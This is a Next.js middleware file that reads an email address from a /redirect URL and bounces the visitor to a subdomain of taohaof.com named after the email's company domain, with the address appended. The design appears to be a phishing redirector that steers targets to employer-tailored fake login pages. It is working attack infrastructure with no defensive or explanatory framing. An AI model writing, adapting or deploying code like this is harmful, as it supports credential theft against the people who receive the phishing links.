import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

function buildRedirect(haystack: string): string | null {
  // Only try if we actually see a marker that the server can receive
  if (!/[$=]|%23/.test(haystack)) return null; // %23 is encoded '#'

  const m = haystack.match(/[$=#]([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})/);
  if (!m) return null;

  const email = m[1].trim();
  const at = email.indexOf("@");
  if (at < 0) return null;

  const domain = email.slice(at + 1);
  const firstLabel = domain.split(".")[0];
  if (!firstLabel) return null;

  const DOMAIN = firstLabel.toUpperCase();
  const encodedEmail = encodeURIComponent(email);
  return `https://${DOMAIN}.taohaof.com/redirect|${encodedEmail}`;
}

export function middleware(req: NextRequest) {
  const { pathname, search } = req.nextUrl;

  // Only handle anything that begins with /redirect
  if (!pathname.startsWith("/redirect")) return NextResponse.next();

  const haystack = `${pathname}${search}`;

  // If there is no marker in path/search (e.g., the # case), allow the page to render
  const dest = buildRedirect(haystack);
  if (!dest) return NextResponse.next();

  return NextResponse.redirect(dest, 302);
}

// Run on almost everything except static assets/Next internals
export const config = {
  matcher: [
    "/((?!_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml|.*\.(?:png|jpg|jpeg|gif|svg|webp|ico|js|css|map|woff2?)).*)",
  ],
};
